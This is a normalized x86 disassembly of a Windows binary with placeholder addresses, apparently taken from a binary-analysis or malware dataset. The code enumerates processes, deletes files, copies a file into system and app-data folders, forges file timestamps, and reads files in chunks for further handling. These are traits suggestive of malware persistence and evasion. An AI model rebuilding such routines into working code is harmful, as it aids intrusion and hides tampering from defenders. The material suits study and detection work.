lea eax [ ebp - 0x14 ]
push eax
call sub_402bc9
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
call eax
sub_4043ca
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
call eax
sub_4043f5
sub esp 0xc
and [ esp ] 0x0
cmp [ ebx + 0x4f00 ] 0x0
jle r-xdata
mov al 0x1
add esp 0xc
retn
push ebp
mov ebp [ Sleep@IAT ]
push esi
push edi
mov esi rw-data
lea edi [ ebx + 0x2c04 ]
push 0x1f4
call ebp
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add edi 0x118
add esi 0x14
cmp eax [ ebx + 0x4f00 ]
jl r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov ecx [ edi - 0x4 ]
lea eax [ esi - 0x8 ]
mov [ eax ] ecx
mov [ esi - 0x4 ] ebx
mov ecx [ edi ]
mov [ esi ] ecx
lea ecx [ edi + 0x10c ]
mov [ esi + 0x4 ] ecx
mov cl [ edi + 0x110 ]
mov [ esi + 0x8 ] cl
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push eax
push sub_40436d
push 0x10000
push 0x0
call [ CreateThread@IAT ]
push 0x0
mov [ esp + 0x14 ] eax
call ebp
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
sub_40449a
mov eax sub_41d84f
call sub_4198ec
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
mov [ ebp - 0x18 ] esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0xa10 ] bl
je r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ edi + 0x4 ]
imul eax eax 0x118
push esi
call [ eax + esi + 0x8fc ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_402bc9
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0xa10 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
call eax
sub_404514
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x18 ]
mov eax [ edi + 0x4 ]
imul eax eax 0x118
cmp [ eax + esi + 0xa10 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
call eax
sub_40454f
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
push esi
cmp [ edi + 0x2bfc ] ebx
jle r-xdata
pop esi
mov al 0x1
pop ebx
leave
retn
mov esi [ Sleep@IAT ]
lea eax [ edi + 0xa0c ]
mov [ ebp - 0x8 ] eax
push 0xc8
call esi
add [ ebp - 0x8 ] 0x118
inc ebx
cmp ebx [ edi + 0x2bfc ]
jl r-xdata
push 0xffffffff
push [ ebp - 0x4 ]
call [ WaitForSingleObject@IAT ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0x4 ]
add [ eax ] ecx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push sub_40449a
push 0x10000
push 0x0
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] ebx
call [ CreateThread@IAT ]
push 0x0
mov [ ebp - 0x4 ] eax
call esi
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
sub_4045d8
mov eax sub_41d845
call sub_4198ec
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ecx + 0x4 ]
imul ecx ecx 0x14
push eax
call [ ecx + eax + 0x590 ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40462d
push ecx
push ecx
mov eax [ edi + 0x810 ]
test eax eax
jg r-xdata
push ebp
xor ebp ebp
test eax eax
jle r-xdata
xor al al
jmp r-xdata
mov al 0x1
pop ebp
push ebx
push esi
mov esi rw-data
lea ebx [ edi + 0x5a0 ]
pop ecx
pop ecx
retn
push 0xc8
call [ Sleep@IAT ]
inc ebp
add ebx 0x14
add esi 0xc
cmp ebp [ edi + 0x810 ]
jl r-xdata
cmp [ ebx - 0x4 ] 0x0
jne r-xdata
xor eax eax
lea ecx [ esp + 0x10 ]
push ecx
push eax
push esi
push sub_4045d8
push 0x10000
push eax
mov [ esi ] edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
call [ CreateThread@IAT ]
push 0x0
mov [ esp + 0x10 ] eax
call [ Sleep@IAT ]
cmp [ esp + 0xc ] 0xffffffff
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
push [ esp + 0xc ]
add [ ebx ] eax
call [ CloseHandle@IAT ]
push 0xffffffff
push [ esp + 0x10 ]
call [ WaitForSingleObject@IAT ]
sub_4046cc
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41d8a1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ esp + 0x4 ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
or [ rw-data ] 0x1
and [ esp + 0xc ] 0x0
call sub_40288f
push sub_41eabc
call sub_413278
pop ecx
or [ esp + 0xc ] 0xffffffff
sub_404726
push ebp
mov ebp esp
sub esp 0x22c
push ebx
push 0x0
push 0x2
mov [ ebp - 0x22c ] 0x22c
call [ CreateToolhelp32Snapshot@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ ebp - 0x22c ]
push eax
push ebx
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
mov al 0x1
push edi
mov edi rw-data
lea eax [ ebp - 0x22c ]
push edi
push eax
call sub_403518
pop ecx
pop ecx
cmp al 0x1
jne r-xdata
pop ebx
leave
retn
pop edi
push esi
mov esi [ Process32NextW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x22c ]
push eax
push ebx
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x22c ]
push edi
push eax
call sub_403518
pop ecx
pop ecx
test al al
je r-xdata
pop esi
sub_4047b2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
sub eax ebx
push esi
mov edx 0x80
je r-xdata
mov eax 0x80000000
push 0x3
jmp r-xdata
dec eax
je r-xdata
pop ecx
jmp r-xdata
mov edx 0x80000080
dec eax
je r-xdata
push ebx
push edx
push ecx
push ebx
push 0x3
push eax
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax 0xc0000000
push 0x4
dec eax
je r-xdata
cmp [ ebp + 0xc ] 0x6
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx 0x80000080
dec eax
je r-xdata
mov eax esi
push 0x2
push ebx
push ebx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov eax 0x40000000
push 0x2
jmp r-xdata
dec eax
je r-xdata
mov edx 0x80000080
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
sub_404842
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x10 ] eax
je r-xdata
xor eax eax
jmp r-xdata
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ReadFile@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
leave
retn 0xc
sub_404878
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
je r-xdata
leave
retn 0xc
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
sub_4048a5
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_4047b2
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
mov al 0x1
retn 0x4
sub_4048cc
push ebp
mov ebp esp
sub esp 0x288
test ebx ebx
jne r-xdata
push edi
push 0x20
push ebx
call [ SetFileAttributesW@IAT ]
mov edi [ DeleteFileW@IAT ]
push ebx
call edi
test eax eax
jne r-xdata
xor al al
jmp r-xdata
setne al
pop edi
cmp [ ebp + 0xc ] al
je r-xdata
leave
retn 0x8
test eax eax
push esi
push 0x104
push ebx
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcpynW@IAT ]
push 0x7
push [ ebp + 0x8 ]
xor eax eax
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ax
call sub_4039ef
mov eax esi
push eax
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push ebx
call [ MoveFileW@IAT ]
pop esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x288 ]
push eax
call edi
push ebx
call edi
sub_404959
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x464
push ebx
mov ebx edx
push esi
push edi
mov [ esp + 0x10 ] ecx
test ebx ebx
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edi [ lstrcpyW@IAT ]
push ebx
lea eax [ esp + 0x1c ]
push eax
call edi
push ebx
call [ GetFileAttributesW@IAT ]
mov esi [ lstrcatW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x220 ]
push eax
lea eax [ esp + 0x1c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
test al 0x10
je r-xdata
test [ esp + 0x220 ] 0x10
jne r-xdata
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
push r--data
lea eax [ esp + 0x250 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x220 ]
push eax
push [ esp + 0x18 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x250 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x0
call [ Sleep@IAT ]
push [ ebp + 0x18 ]
lea eax [ esp + 0x224 ]
push eax
push ebx
push [ esp + 0x1c ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push [ esp + 0x14 ]
call [ FindClose@IAT ]
mov al 0x1
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
push [ ebp + 0x18 ]
lea eax [ esp + 0x224 ]
push eax
push ebx
push [ esp + 0x1c ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push ebx
lea eax [ esp + 0x1c ]
push eax
call edi
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
lea eax [ esp + 0x24c ]
push eax
lea eax [ esp + 0x1c ]
push eax
call esi
push [ ebp + 0x18 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
mov ecx [ esp + 0x18 ]
push [ ebp + 0x10 ]
dec eax
push [ ebp + 0xc ]
lea edx [ esp + 0x28 ]
push eax
call sub_404959
sub_404ae4
push ebp
mov ebp esp
sub esp 0x20c
push edi
xor eax eax
push 0x206
mov [ ebp - 0x20c ] ax
xor edi edi
lea eax [ ebp - 0x20a ]
push edi
push eax
call sub_4130d0
add esp 0xc
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x20c ]
push eax
call [ GetSystemDirectoryW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
pop edi
leave
retn 0x4
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x20c ]
push eax
call [ GetSystemWow64DirectoryW@IAT ]
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
call esi
lea edi [ ebp - 0x20c ]
call sub_403fca
pop esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ ebp - 0x20c ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
cmp eax edi
je r-xdata
sub_404bc8
push ebp
mov ebp esp
sub esp 0x208
push esi
xor eax eax
push 0x206
mov [ ebp - 0x208 ] ax
xor esi esi
lea eax [ ebp - 0x206 ]
push esi
push eax
call sub_4130d0
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
push esi
push esi
push 0x1c
push esi
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
pop esi
leave
retn 0x4
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_403fca
pop edi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
sub_404c6d
push ebp
mov ebp esp
sub esp 0x208
push edi
xor eax eax
push 0x206
mov [ ebp - 0x208 ] ax
xor edi edi
lea eax [ ebp - 0x206 ]
push edi
push eax
call sub_4130d0
add esp 0xc
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call sub_4016e2
movzx eax al
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
pop edi
leave
retn 0x4
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea edi [ ebp - 0x208 ]
call sub_403fca
pop esi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
sub_404d1a
mov eax sub_41d8b3
call sub_4198ec
sub esp 0x224
push ebx
push esi
push 0x1
push 0x104
lea eax [ ebp - 0x22c ]
push eax
call sub_4016e2
test al al
je r-xdata
xor al al
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
call sub_4017b9
push 0x1
push eax
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
call sub_405d65
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x24 ]
call sub_405f2c
push [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x14 ]
call sub_40178c
cmp al bl
je r-xdata
lea eax [ ebp - 0x22c ]
test eax eax
jne r-xdata
push 0x2
lea eax [ ebp - 0x22c ]
push eax
call sub_4047b2
mov esi eax
cmp esi ebx
je r-xdata
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x24 ]
push esi
call sub_404878
push esi
cmp eax ebx
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
push [ ebp + 0xc ]
call sub_4048a5
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0xc ]
lea eax [ ebp - 0x22c ]
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_4048cc
mov bl 0x1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x24 ]
call sub_405f2c
mov al bl
jmp r-xdata
sub_404e26
push ebp
mov ebp esp
sub esp 0xe0
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] 0x0
jne r-xdata
push 0x2
lea eax [ ebp - 0xdc ]
push eax
push [ ebp + 0x8 ]
call sub_403a65
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0xdc ]
push eax
call sub_404ae4
mov edi [ CopyFileW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0xdc ]
push eax
call sub_404bc8
mov esi eax
test esi esi
je r-xdata
push 0x1
push [ ebp + 0x8 ]
mov ebx esi
call sub_4048cc
push 0x0
push esi
push [ ebp + 0xc ]
call edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
lea eax [ ebp - 0xdc ]
push eax
call sub_404c6d
mov esi eax
test esi esi
je r-xdata
push 0x1
push [ ebp + 0x8 ]
mov ebx esi
call sub_4048cc
push 0x0
push esi
push [ ebp + 0xc ]
call edi
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_405c44
xor esi esi
mov eax esi
push 0x1
push [ ebp + 0x8 ]
mov ebx esi
call sub_4048cc
push 0x0
push esi
push [ ebp + 0xc ]
call edi
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_405c44
xor esi esi
push 0x8
pop ecx
push 0x1a8422
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x34 ]
lea ebx [ ebp - 0x34 ]
[ edi ]
call sub_40394f
xor ebx ebx
lea edi [ eax + 0x8d6b6 ]
mov [ ebp - 0x10 ] ebx
cmp esi ebx
jne r-xdata
test esi esi
je r-xdata
push esi
call sub_405c44
xor esi esi
push 0x2
push esi
call sub_4047b2
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
or [ ebp + 0xc ] 0xffffffff
jmp r-xdata
push esi
call sub_405c44
xor esi esi
push ebx
push ebx
push edi
push [ ebp + 0xc ]
call [ SetFilePointer@IAT ]
lea eax [ ebp - 0x5 ]
mov [ ebp + 0x10 ] ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call [ GetSystemTime@IAT ]
push 0x8
pop ecx
push 0x4
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x58 ]
lea ebx [ ebp - 0x58 ]
[ edi ]
call sub_40394f
movzx eax ax
mov [ ebp + 0x10 ] eax
test ax ax
jne r-xdata
push ebx
lea eax [ ebp + 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x5 ]
push eax
push [ ebp + 0xc ]
call [ WriteFile@IAT ]
push 0xc
pop edx
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp - 0x1e ] ax
jne r-xdata
push 0x8
xor eax eax
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ]
test edx edx
je r-xdata
movzx edx [ ebp - 0x22 ]
cmp [ ebp - 0x22 ] ax
jne r-xdata
mov eax [ rw-data ]
push edx
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x58 ]
call sub_40394f
jmp r-xdata
mov eax 0xffff
add [ ebp - 0x22 ] ax
push 0x1c
pop eax
mov [ ebp - 0x1e ] ax
mov [ ebp + 0x10 ] eax
push 0x1c
pop edx
cmp bx [ ebp - 0x22 ]
jne r-xdata
inc eax
cmp [ ebp + 0x10 ] 0x0
movzx ebx ax
mov [ ebp - 0x38 ] ebx
jne r-xdata
mov eax [ rw-data ]
push edx
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x58 ]
call sub_40394f
mov ebx [ ebp - 0x38 ]
jmp r-xdata
movzx edx [ ebp - 0x1e ]
dec edx
jmp r-xdata
inc eax
mov [ ebp - 0x1e ] ax
mov ax [ ebp + 0x10 ]
sub [ ebp - 0x24 ] ax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x22 ] bx
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push eax
push eax
push [ ebp + 0xc ]
call [ SetFileTime@IAT ]
push [ ebp + 0xc ]
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x8
xor eax eax
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ]
test edx edx
je r-xdata
sub_405084
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dbd4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
lea eax [ esp + 0x3c ]
push eax
call sub_401108
xor ebx ebx
mov [ esp + 0x6c ] ebx
lea esi [ esp + 0x2c ]
call sub_405d11
mov [ esp + 0x6c ] 0x1
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x1c ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x10 ]
push 0x8
pop edi
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x54 ]
mov [ esp + 0xc ] eax
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x58 ]
mov [ esp + 0x24 ] 0x72682c0
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x29 ] edi
call sub_4060be
mov eax [ esp + 0xc ]
mov [ esp + 0x25 ] eax
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
call sub_4060be
lea eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x54 ]
push ebx
mov [ esp + 0x10 ] ecx
push eax
mov eax edi
lea ecx [ esp + 0x58 ]
mov [ esp + 0x24 ] 0x6354ec21
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x29 ] edi
call sub_4060be
mov eax [ esp + 0xc ]
mov [ esp + 0x25 ] eax
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
call sub_4060be
push [ ebp + 0x10 ]
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x10 ]
push 0x1a2e71c0
lea edi [ esp + 0x40 ]
call sub_4011e8
mov eax [ esi ]
push 0x4
pop edi
mov [ esp + 0x25 ] eax
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x24 ] 0x153b88ff
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x29 ] edi
call sub_4060be
lea eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x54 ]
push ebx
mov [ esp + 0x10 ] ecx
push eax
mov eax edi
lea ecx [ esp + 0x58 ]
mov [ esp + 0x24 ] 0x6d49ed2e
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x29 ] edi
call sub_4060be
mov eax [ esp + 0xc ]
mov [ esp + 0x25 ] eax
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
call sub_4060be
mov ecx [ ebp + 0x1c ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ esp + 0x25 ] eax
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x24 ] 0x1d2b8ef1
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x29 ] edi
call sub_4060be
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x3c ]
call sub_40120a
mov edi [ Sleep@IAT ]
push 0xa
call edi
push ebx
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp eax ebx
jle r-xdata
call edi
push [ esp + 0x30 ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x28
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ esp + 0x44 ]
push [ esp + 0x44 ]
call sub_40242d
test al al
je r-xdata
mov ecx [ ecx ]
cmp ecx ebx
je r-xdata
push 0x493e0
mov [ esp + 0x6c ] bl
lea esi [ esp + 0x2c ]
call sub_405f2c
or [ esp + 0x6c ] 0xffffffff
lea eax [ esp + 0x3c ]
push eax
call sub_40114f
mov ecx [ esp + 0x64 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov esi [ esp + 0x54 ]
push ebx
push ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x24 ] 0x7d3996f2
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x29 ] eax
call sub_4060be
push ebx
lea eax [ esp + 0x20 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x2d ] esi
call sub_4060be
sub_4052e6
push ebp
mov ebp esp
mov eax 0x15bb0
call sub_419050
push ebx
mov ebx [ ebp + 0x10 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x8 ] esi
cmp ebx esi
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
cmp ebx esi
je r-xdata
push esi
push ebx
call sub_4047b2
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov al 0x1
push esi
push ebx
call sub_4047b2
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
mov edi [ Sleep@IAT ]
push edi
call [ CloseHandle@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x15bac ]
mov [ ebp - 0x10 ] esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x15b90
lea eax [ ebp - 0x15bac ]
push eax
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
mov ebx eax
neg ebx
sbb ebx ebx
and ebx [ ebp - 0x10 ]
xor ebx ebx
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
jmp r-xdata
push 0xa
call edi
push esi
call edi
cmp ebx esi
jbe r-xdata
push 0xa
call edi
push esi
call edi
cmp ebx esi
ja r-xdata
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call [ ebp + 0x1c ]
add esp 0x10
test al al
je r-xdata
push [ ebp - 0x14 ]
mov esi [ ebp + 0x8 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x15bac ]
push 0x28
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push ebx
push eax
call sub_40242d
test al al
je r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
push 0x493e0
call edi
push 0xa
call edi
push 0x0
call edi
add [ ebp - 0x8 ] ebx
xor esi esi
sub_40541b
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
call sub_403aef
push [ ebp + 0x1c ]
mov esi eax
push esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_405084
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4052e6
pop esi
pop ecx
pop ebp
retn 0x20
sub_40545d
